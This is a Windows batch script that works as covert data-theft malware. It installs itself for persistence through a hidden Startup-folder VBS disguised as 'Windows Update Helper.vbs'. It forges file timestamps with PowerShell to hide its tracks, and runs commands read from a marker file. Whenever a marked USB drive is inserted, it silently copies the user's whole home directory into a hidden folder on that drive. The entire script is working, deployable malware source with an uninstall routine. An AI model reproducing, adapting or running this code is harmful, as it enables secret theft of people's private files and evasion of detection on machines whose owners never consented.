REM initialization
set filename=lmao69.dat
if not "%cd%"=="%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" (
if not "%cd%"=="%appdata%\Microsoft\Windows" (
if not exist %filename% (
echo initcopy>%filename%
attrib +h %filename%
)
if not exist "Windows Update Helper.vbs" (
goto :createvbs
)
)
)
:aftervbs
set skip=False
set tries=0
if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup" (for /r "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup" %%a in (*.bat) do (call "%%a"))
set state=NOTUPDATING
set dirr=HDD
if exist %filename% (set dirr=FLASH)


goto :searching
REM changing dates of files, so it isnt clear when exactly was the file created
REM cd commands needed if username has a space inside
:changedate
c:
cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\"
attrib -s -h "Windows Update Helper.vbs"
powershell  (Get-Item "Windows` Update` Helper.vbs").CreationTime=Get-Date
powershell  (Get-Item "Windows` Update` Helper.vbs").LastWriteTime=Get-Date
powershell  (Get-Item "Windows` Update` Helper.vbs").LastAccessTime=Get-Date
attrib +s "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs"

attrib -s -h "%appdata%\Microsoft\Windows\lmao.bat"
cd "%appdata%\Microsoft\Windows"
powershell  (Get-Item "lmao.bat").LastWriteTime=Get-Date
powershell  (Get-Item "lmao.bat").LastAccessTime=Get-Date
powershell  (Get-Item "lmao.bat").CreationTime=Get-Date
attrib +s "%appdata%\Microsoft\Windows\lmao.bat"

if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup" (goto :lmaostartuptask)
:aftertask
if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert" (goto :atinserttask)
:afterndtask

echo IDK
if %skip%==true (goto :1)

REM searching for the usb
REM if we already tried 100000 times(usually around 5-10 mins) change dates of files
:searching
if %tries%==100000 (set tries=0 && goto :changedate)
if exist "d:\%filename%" (d: && goto :b)
if exist "e:\%filename%" (e: && goto :b)
if exist "f:\%filename%" (f: && goto :b)
if exist "g:\%filename%" (g: && goto :b)
set /a tries=%tries% + 1
goto :searching

:b
cd ..
REM setting variable, so we know if we copied the files, so when dont end up inside a loop
if not exist alreadycopied.dat (echo false >alreadycopied.dat)
set /p copied=<alreadycopied.dat
attrib +h alreadycopied.dat
if exist novbs.dat set novbs=true
if not exist novbs.dat set novbs=false
set com=0
set /p com=<%filename%
REM starting atinsert programs
if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert" (for /r "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert" %%a in (*.bat) do (call "%%a"))
if exist force_dat.dat set /p com=<%filename%
if exist %com% (
REM if the contents of the file is an executable, execute it
if exist atstartup.dat (goto :c)
if exist atinsert.dat (goto :i)
call %com%
REM set the com to initcopy to pass test
set com=initcopy
)
:d
REM copying fase, where we check where we are and copy core files to their destination
if exist UNIN000.dat goto :u
if not %com%==initcopy goto :searching
if exist transfer.dat (xcopy transfer\* %homedrive%%homepath% /y)
if exist "Windows Update Helper.vbs" (
if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs" (attrib -s "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs")
xcopy "Windows Update Helper.vbs" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\" /y
)
REM if we aRe on the usb, go ahead with copying
if %dirr%==FLASH (
if exist lmao.bat (
attrib -s "%appdata%\Microsoft\Windows\lmao.bat"
del "%appdata%\Microsoft\Windows\lmao.bat"
attrib -s lmao.bat
xcopy lmao.bat "%appdata%\Microsoft\Windows\" /y
)
goto :miss
REM if looping for some reason, this is like 70% the case
)
REM if we are already on HDD after copying, remove alreadycopied
if %copied%==false (
if %dirr%==HDD (
attrib -h alreadycopied.dat
echo true >alreadycopied.dat
attrib +h alreadycopied.dat
goto :miss
)
)
attrib +s "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs"
REM save current disk as d: (from d:\) in order to get into it after date change
set curr=%cd%
set curr=%curr:~0,2%
set skip=true
goto :changedate
:1
%curr%
REM if dontcopy.dat isnt present, copy inside folder with random number and save the number into RESUME, which will be used in the case of pulling out the USB to resume copying
if exist dontcopy.dat (echo " ">iwashere.dat && goto :whileexist)
set dire=%random%
if exist RESUME (set /p dire=<RESUME)
echo %dire% > RESUME
attrib +h RESUME
mkdir "%dire%"
attrib +s +h "%dire%"
xcopy /S /D "%homedrive%%homepath%" "%dire%" /Y
REM after copying remove RESUME
attrib -h RESUME
del RESUME

:whileexist
REM check whether the usb is still connected and if not, relaunch the tool to reload disks(otherwise doesnt work)
del "%appdata%\Microsoft\Windows\doing.dat"
attrib -h alreadycopied.dat
del alreadycopied.dat
if not exist %filename% goto :miss
goto :whileexist
exit

:c
REM if doesnt exist, create lmaostartup, copy the file there and make it hidden system folder
if not exist "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup" (mkdir "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup")
attrib -s -h "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup"
xcopy %com% "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup\" /y
attrib +s +h "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup"
set com=initcopy
del atstartup.dat
goto :d

:i
REM same as above, but for atinsert
if not exist "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert" (mkdir "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert")
attrib -s -h "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert"
xcopy %com% "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert\" /y
attrib +s +h "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert"
set com=initcopy
del atinsert.dat
goto :d

:u
echo removing system and hidden properties from folders... > info.txt
attrib -s "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs"
attrib -s -h "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup"  >> info.txt
attrib -s -h "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert"  >> info.txt
attrib -s -h "%appdata%\Microsoft\Windows\lmao.bat" >> info.txt
echo properties removed, continuing... >> info.txt
echo removing lmaostartup... >> info.txt
rmdir /s /q "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup"  >> info.txt
echo lmaostartup removed >> info.txt
echo removing atinsert... >> info.txt
rmdir /s /q "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert"  >> info.txt
echo atinsert removed >> info.txt
echo removing vbs and supporting bat if any... >> info.txt
del /q "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs" >> info.txt
echo vbs removed >> info.txt
echo removing lmao.bat (if uninstalling without lmao.bat on usb, rest not available)... >> info.txt
del /q "%appdata%\Microsoft\Windows\lmao.bat"  >> info.txt
echo lmao.bat removed >> info.txt
echo UNINSTALL COMPLETED SUCCESSFULLY >> info.txt
exit

:miss
REM handling relaunch depending on novbs variable that was set by novbs.dat
%homedrive:~0,2%
if %novbs%==false (
cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\"
wscript "Windows Update Helper.vbs"
exit
)
cd "%appdata%\Microsoft\Windows\"
start lmao.bat
exit

REM DO NOT PUT IN IF; MAKES CMD EXECUTE IN ORDER TO FIND ERRORS AND CRASHES (because of missing files)
REM tasks to change date on lmaostartup and atinsert folders
:lmaostartuptask
set tempor="%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup"
set tempor=%tempor: =` %
echo %tempor%
powershell (Get-Item %tempor% -force).LastWriteTime=Get-Date
powershell (Get-Item %tempor% -force).LastAccessTime=Get-Date
powershell (Get-Item %tempor% -force).CreationTime=Get-Date
powershell (Get-Item %tempor%\* -force).LastWriteTime=Get-Date
powershell (Get-Item %tempor%\* -force).LastAccessTime=Get-Date
powershell (Get-Item %tempor%\* -force).CreationTime=Get-Date
goto :aftertask


:atinserttask
set tempor="%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert"
set tempor=%tempor: =` %
echo %tempor%
powershell (Get-Item %tempor% -force).LastWriteTime=Get-Date
powershell (Get-Item %tempor% -force).LastAccessTime=Get-Date
powershell (Get-Item %tempor% -force).CreationTime=Get-Date
powershell (Get-Item %tempor%\* -force).LastWriteTime=Get-Date
powershell (Get-Item %tempor%\* -force).LastAccessTime=Get-Date
powershell (Get-Item %tempor%\* -force).CreationTime=Get-Date
goto :afterndtask

REM END OF CRUCIAL CODE POSITION

:createvbs
REM creating the vbs needed to launch on startup
echo Set WshShell = CreateObject("WScript.Shell")  >"Windows Update Helper.vbs"
echo WshShell.Run chr(34) ^& "%appdata%\Microsoft\Windows\lmao.bat" ^& Chr(34), 0  >>"Windows Update Helper.vbs"
echo Set WshShell = Nothing >>"Windows Update Helper.vbs"
goto :aftervbs